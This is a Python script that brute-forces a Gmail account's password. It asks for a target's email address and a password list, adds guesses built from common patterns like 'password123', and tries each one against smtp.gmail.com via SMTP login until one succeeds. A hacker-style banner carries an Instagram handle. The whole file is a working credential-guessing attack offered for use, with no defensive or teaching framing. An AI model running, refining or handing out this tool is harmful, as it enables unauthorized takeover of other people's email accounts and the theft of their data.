import smtplib
import itertools
import time

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()


class bcolors:
    FAIL = '\033[91m'
    ENDC = '\033[0m'

print("""                     ^__^             
 ______________You are already in our world____________________________
/____/____/____/____/____/____/____/____/____/____/____/____/____/____/
                 |_| instagram: """ + bcolors.FAIL + "mhagne_mhmod" + bcolors.ENDC)
                 

user = input("Enter the Target's email: ")

password_file = input("Enter the password. file: ")

def generate_passwords():
    # Implement password generation logic here
    # This can include combinations of common patterns, words, numbers, etc.
    # Use itertools to generate combinations, permutations, or product of different elements
    # Return a generator object that generates passwords
    
    # Example: Generating passwords using combinations of common patterns
    patterns = ['%s123', '123%s', '%s@2023', '2023%s']
    keywords = ['password', 'qwerty', 'admin', 'letmein']
    numbers = ['123', '456', '789']
    
    for pattern in patterns:
        for keyword in keywords:
            for number in numbers:
                yield pattern.replace('%s', keyword) + number

def check_password(password):
    try:
        smtpserver.login(user, password)
        return password
    except smtplib.SMTPAuthenticationError:
        return None

with open(password_file, "r") as passwfile:
    passwords = itertools.chain(passwfile, generate_passwords())
    
    for password in passwords:
        password = password.strip()
        result = check_password(password)
        if result:
            print("[+] Password Found: %s" % result)
            break
        else:
            print("[!] Incorrect Password: %s" % password)
        
        # Delay between each password attempt (adjust the sleep duration as needed)
        time.sleep(0.5)  # Sleep for 0.5 seconds before the next attempt

smtpserver.quit()
